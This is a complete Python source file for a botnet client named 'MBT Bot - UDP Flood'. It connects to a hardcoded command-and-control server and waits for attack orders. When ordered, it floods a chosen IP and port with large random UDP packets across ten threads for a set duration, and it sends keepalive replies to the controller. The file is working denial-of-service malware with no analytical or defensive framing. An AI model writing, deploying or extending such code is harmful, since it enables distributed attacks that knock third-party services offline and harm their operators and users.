#!/usr/bin/env python3
"""
MBT Bot - UDP Flood
"""

import socket
import threading
import time
import random

C2_HOST = "172.16.216.100"
C2_PORT = 1337

class Bot:
    def __init__(self):
        self.running = True
        self.attacking = False
        
    def udp_flood(self, ip, port, duration):
        print(f"[+] FLOODING {ip}:{port} for {duration}s")
        end = time.time() + duration
        
        def send():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random.randbytes(65000)
            while time.time() < end and self.attacking:
                try:
                    sock.sendto(payload, (ip, port))
                except:
                    pass
            sock.close()
        
        threads = []
        for _ in range(10):
            t = threading.Thread(target=send)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print(f"[+] FLOOD COMPLETE")
    
    def connect(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((C2_HOST, C2_PORT))
                print(f"[+] Connected to C2")
                s.send(b"BOT\n")
                
                while self.running:
                    try:
                        s.settimeout(10)
                        data = s.recv(1024)
                        if not data:
                            break
                        cmd = data.decode().strip()
                        
                        if cmd.startswith("UDP"):
                            parts = cmd.split()
                            if len(parts) == 4:
                                _, ip, port, dur = parts
                                self.attacking = True
                                self.udp_flood(ip, int(port), int(dur))
                                self.attacking = False
                    except socket.timeout:
                        s.send(b"PONG\n")
                        continue
                    except:
                        break
                s.close()
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(5)
        print("[+] Bot offline")

if __name__ == "__main__":
    print("MBT BOT - UDP FLOOD")
    Bot().connect()
